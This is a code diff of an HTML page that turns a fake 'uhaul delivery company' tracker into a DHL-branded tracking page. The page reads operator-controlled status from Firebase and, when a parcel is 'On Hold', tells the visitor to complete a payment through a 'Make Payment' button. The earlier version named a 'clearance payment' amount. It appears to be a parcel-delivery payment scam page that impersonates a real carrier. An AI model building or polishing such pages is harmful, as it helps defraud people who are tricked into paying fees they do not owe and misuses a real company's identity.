@@ -1,157 +1,126 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DHL Tracking</title>
 
 <style>
 body {
-    background:#000;
-    color:#fff;
     font-family: Arial;
-    margin:0;
-    padding:15px;
+    background: #f5f5f5;
+    text-align: center;
+}
+
+.container {
+    background: white;
+    padding: 20px;
+    margin: 30px auto;
+    width: 90%;
+    max-width: 400px;
+    border-radius: 10px;
 }
 
 h2 {
-    text-align:center;
-    color:#d46bff;
-}
-
-/* INPUT */
-input, button {
-    width:100%;
-    padding:14px;
-    margin-top:10px;
-    border-radius:10px;
-    border:none;
-}
-
-button {
-    background:linear-gradient(to right, purple, violet);
-    color:white;
-    font-weight:bold;
-}
-
-/* CARD */
-.card {
-    background:#111;
-    padding:15px;
-    margin-top:20px;
-    border-radius:12px;
-}
-
-/* TIMELINE */
-.timeline {
-    border-left:2px solid #444;
-    margin-left:15px;
-    padding-left:20px;
+    color: #d40511;
 }
 
 .step {
-    position:relative;
-    margin-bottom:20px;
+    display: flex;
+    align-items: center;
+    margin: 10px 0;
 }
 
-.icon {
-    position:absolute;
-    left:-28px;
-    top:0;
-    font-size:14px;
+.circle {
+    width: 25px;
+    height: 25px;
+    border-radius: 50%;
+    border: 2px solid gray;
+    margin-right: 10px;
 }
 
-/* COLORS */
-.done { color:#00bfff; }      /* blue check */
-.active { color:#00bfff; }    /* current */
-.pending { color:#777; }
-.hold { color:#ff4d4d; }
-
-.small {
-    color:#aaa;
-    font-size:13px;
+.done {
+    background: green;
 }
 
-/* WARNING */
-.warning {
-    margin-top:15px;
-    color:#ff4d4d;
-    font-weight:bold;
+.hold-box {
+    background: #ffe6e6;
+    padding: 15px;
+    margin-top: 15px;
+    border-radius: 8px;
+}
+
+button {
+    background: #d40511;
+    color: white;
+    padding: 10px;
+    border: none;
+    width: 100%;
+    margin-top: 10px;
+    border-radius: 5px;
 }
 </style>
+
 </head>
 
 <body>
 
-<h2>uhaul delivery company</h2>
+<div class="container">
+<h2>DHL Tracking</h2>
 
-<input id="trackInput" placeholder="Enter Tracking Number">
-<button onclick="track()">Track</button>
+<p><b>Status:</b> <span id="status"></span></p>
+<p><b>Location:</b> <span id="location"></span></p>
 
-<div id="result"></div>
+<div class="step">
+<div id="c1" class="circle"></div> Shipment picked
+</div>
+
+<div class="step">
+<div id="c2" class="circle"></div> In transit
+</div>
+
+<div class="step">
+<div id="c3" class="circle"></div> Out for delivery
+</div>
+
+<div class="step">
+<div id="c4" class="circle"></div> Delivered
+</div>
+
+<div id="hold" class="hold-box" style="display:none;">
+<p>Your package is currently on hold. Kindly complete the required payment to continue delivery.</p>
+<button>Make Payment</button>
+</div>
+
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js"></script>
 
 <script>
-function track() {
-    let code = document.getElementById("trackInput").value;
-    let data = JSON.parse(localStorage.getItem(code));
+const firebaseConfig = {
+  apiKey: "PASTE_YOURS",
+  authDomain: "PASTE_YOURS",
+  projectId: "PASTE_YOURS",
+};
 
-    if (!data) {
-        document.getElementById("result").innerHTML = "No shipment found";
-        return;
-    }
+const app = firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 
-    let steps = ["Picked Up", "In Transit", "On Hold", "Out for Delivery"];
-    let currentIndex = steps.indexOf(data.status);
+db.collection("tracking").doc("123456").onSnapshot((doc) => {
 
-    function getClass(i, name) {
-        if (data.status === "On Hold" && name === "On Hold") return "hold";
-        if (i < currentIndex) return "done";
-        if (i === currentIndex) return "active";
-        return "pending";
-    }
+let data = doc.data();
 
-    function getIcon(i) {
-        if (i < currentIndex) return "✔";  // blue check
-        if (i === currentIndex) return "●"; // current step
-        return "○"; // pending
-    }
+document.getElementById("status").innerText = data.status;
+document.getElementById("location").innerText = data.location;
 
-    let holdMessage = "";
-    if (data.status === "On Hold") {
-        holdMessage = `
-        <div class="warning">
-        ⚠ Your package is on hold due to clearance payment.<br>
-        Pay $${data.amount} to proceed with delivery.
-        </div>`;
-    }
-
-    let timelineHTML = "";
-
-    steps.forEach((step, i) => {
-        timelineHTML += `
-        <div class="step ${getClass(i, step)}">
-            <div class="icon">${getIcon(i)}</div>
-            <b>${step}</b><br>
-            <span class="small">${data.location}</span>
-        </div>`;
-    });
-
-    document.getElementById("result").innerHTML = `
-    <div class="card">
-        <h3>${code}</h3>
-
-        <p><b>From:</b> ${data.from}</p>
-        <p><b>To:</b> ${data.to}</p>
-
-        <div class="timeline">
-            ${timelineHTML}
-        </div>
-
-        <p><b>Current Location:</b> ${data.location}</p>
-        <p><b>Date:</b> ${new Date().toDateString()}</p>
-
-        ${holdMessage}
-    </div>
-    `;
+for(let i=1;i<=data.progress;i++){
+    document.getElementById("c"+i).classList.add("done");
 }
+
+if(data.status == "On Hold"){
+    document.getElementById("hold").style.display = "block";
+}
+
+});
 </script>
 
 </body>
